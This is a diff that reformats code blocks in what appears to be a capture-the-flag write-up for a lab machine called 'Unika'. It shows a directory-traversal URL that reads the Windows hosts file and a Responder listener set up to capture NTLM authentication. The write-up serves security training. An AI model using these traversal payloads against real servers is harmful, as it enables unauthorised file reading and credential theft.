@@ -2067,17 +2067,23 @@ After making the changes, we can now view the proper website:
 
 In snooping around on the different pages, we notice that on the language versions of the site the url is showing a page parameter:
 
-```http://unika.htb/index.php?page=french.html```
+```
+http://unika.htb/index.php?page=french.html
+```
 
 This may indicate it is possible to traverse the directory of the webserver for exploitation. 
 
 Since nmap revealed we are attacking a Windows machine, we can try to access a common file that exists: 
 
-```WINDOWS\System32\drivers\etc\hosts```
+```
+WINDOWS\System32\drivers\etc\hosts
+```
 
 Modifying the url to access this file, we can try the following URL:
 
-```http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts```
+```
+http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
+```
 
 Refreshing the webpage, we have successfully revealed the windows host file:
 
@@ -2150,7 +2156,6 @@ We can now take this one step further and exploit the NTLM authentication using 
     Responder DCE-RPC Port     [49336]
 
 [+] Listening for events...                                                                                                           
-
 ```
 Now that responder is ready, we can try access any file by exploiting the page parameter. We can try:
 
